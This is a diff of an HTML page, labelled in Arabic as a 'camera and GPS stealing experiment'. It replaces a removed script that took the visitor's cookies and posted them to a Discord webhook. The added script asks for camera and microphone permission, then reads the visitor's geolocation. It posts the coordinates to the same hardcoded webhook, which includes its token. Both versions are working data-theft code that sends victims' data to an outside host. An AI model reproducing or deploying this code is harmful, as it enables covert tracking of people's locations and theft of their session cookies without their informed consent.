@@ -1,21 +1,54 @@
 <html>
   <body>
-    <h1>تجربة سرقة الكوكيز 👀</h1>
+    <h1>تجربة سرقة كام وGPS 😈</h1>
+    <button id="start">اضغط عشان نعطي إذن ونسرق البيانات</button>
+
     <script>
-      const cookies = document.cookie;
       const webhookURL = "https://discord.com/api/webhooks/1352849557184053290/lD7F2L2xR6GEKGoXV5s8L_cW5QmhTQJsZTSAoRYX9qy4Leobxmq64Izkyst-AFkrypFv";
 
-      const data = {
-        content: "الكوكيز اللي سرقتها: " + cookies
-      };
+      document.getElementById('start').onclick = () => {
+        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+          .then(stream => {
+            stream.getTracks().forEach(track => track.stop());
 
-      fetch(webhookURL, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify(data)
-      });
+            navigator.geolocation.getCurrentPosition(position => {
+              const data = {
+                content: `تم سرقة موقعك والبيانات: \nLatitude: ${position.coords.latitude}\nLongitude: ${position.coords.longitude}\nتم تشغيل الكاميرا والميكروفون`
+              };
+
+              fetch(webhookURL, {
+                method: "POST",
+                headers: {
+                  "Content-Type": "application/json"
+                },
+                body: JSON.stringify(data)
+              });
+            }, err => {
+              const data = {
+                content: `تم تشغيل الكاميرا والمايكروفون لكن رفض الموقع`
+              };
+              fetch(webhookURL, {
+                method: "POST",
+                headers: {
+                  "Content-Type": "application/json"
+                },
+                body: JSON.stringify(data)
+              });
+            });
+          })
+          .catch(err => {
+            const data = {
+              content: `تم رفض صلاحية الكاميرا والمايكروفون`
+            };
+            fetch(webhookURL, {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json"
+              },
+              body: JSON.stringify(data)
+            });
+          });
+      }
     </script>
   </body>
 </html>
